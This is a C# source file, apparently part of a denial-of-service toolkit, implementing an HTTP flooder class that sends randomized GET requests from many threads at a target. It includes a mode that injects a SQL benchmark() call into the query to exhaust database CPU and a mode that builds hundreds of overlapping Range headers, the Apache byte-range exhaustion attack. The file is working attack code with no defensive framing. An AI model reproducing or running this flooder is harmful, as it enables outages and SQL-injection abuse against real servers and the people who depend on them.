using System.Net;
using System.Net.Sockets;
using System.Text;
using GAS.Core.AttackInformation;
using RandomStringGenerator;
using RandomStringGenerator.Expressions;
using RandomStringGenerator.Helpers;

namespace GAS.Core.Attacks {
    public class AwesomeHttpFlooder:IAttacker {
        private AsyncFlooder _flooder;
        private MultiExpression _headers;
        private int[][] _exprBuffers;

        public AwesomeHttpFlooder( IPEndPoint target, HttpAttackParams attackParams, int threadCount = 1 ) {
            var info = new AttackInfo {
                Target = target,
                Protocol = ProtocolType.Tcp,
                Randomizer = this.GenerateHeaderBytes,
                MaxWrite = 1,
                SendBufferSize = 512,
                ReadBufferSize = 512
            };
            if ( attackParams.WaitForResponse )
                info.MaxRead = ulong.MaxValue;
                
            _flooder = new AsyncFlooder( info, threadCount );
            this._headers = CreateHeaderExpression( attackParams );
            this._exprBuffers = new int[ threadCount ][];
            var c = this._headers.ComputeLengthDataSize();
            for (var i = 0; i < threadCount; i++)
                this._exprBuffers[ i ] = new int[c];
        }

        public override void Start() {
            _flooder.Start();
        }

        public override void Stop() {
            _flooder.Stop();
        }

        private unsafe int GenerateHeaderBytes( byte[] buffer, int threadIndex ) {
            fixed (int* feB = this._exprBuffers[threadIndex]){
                fixed (byte* fb = buffer) {
                    var eB = feB; var eb2=eB-1; var b = fb;
                    long sz=0;
                    _headers.GetInsertLength( ref eB );
                    while ( eb2 < eB )
                        sz += *( ++eb2 );
                    eB = feB;
                    _headers.InsertAsciiBytes( ref eB, ref b );
                    return (int) sz;
                }
            }
        }
        private static MultiExpression CreateHeaderExpression(HttpAttackParams p) {
            var query = p.Query;
            if ( p.AttackType == HttpAttackType.RefRef)
                query += "%20and%20(select+benchmark({I:D:999999:999999999},0x{S:H:48:48}))";
            var bld = new StringBuilder();
            bld.AppendFormat( "GET {0}{1} HTTP/1.1", query, p.RandomAppendUrl ? "{R:{&{S:L:1:5}={S:U:1:50}}:0:3}" :"");
            bld.AppendLine();
            //subdomains
            bld.AppendFormat("Host: {0}{1}", p.RandomAppendHost?"{R:{{S:a:3:12}.}:0:2}":"", p.Dns );
            bld.AppendLine();
            bld.AppendLine( "Accept: */*" );
            bld.AppendLine( "Connection: close" );
            if (p.Gzip)
                bld.AppendLine( "Accept-Encoding: gzip,deflate" );
            //all versions of chrome and safari
            bld.AppendLine( "Mozilla/5.0 (Windows NT 6.{I:D:0:2}) AppleWebKit/{I:D:536:537}.{I:D:0:35}"+
                " (KHTML, like Gecko) Chrome/{I:D:25:35}.0.{I:D:1100:1800}.{I:D:0:10}"+
                " Safari/{I:D:536:537}.{I:D:0:35}" );
            //lot's of http range  requests
            //Moar info: http://1337day.com/exploits/16729
            if ( p.AttackType == HttpAttackType.AhrDosme ) {
                bld.Append( "Range:bytes=" );
                var l = Generators.Random.Next(600, 1000 );
                var l2 = Generators.Random.Next( 30 );
                for (var i = 0; i < l; i++) {
                    bld.Append( l2 >> 1 + ( i %  l2 )  );
                    bld.Append( '-' );
                    bld.Append( i );
                    if ( i < l - 1 ) bld.Append( ',' );
                }
                bld.AppendLine();
            }
            bld.AppendLine();
            return ExpressionParser.Create( bld.ToString() );
        }
    }
}
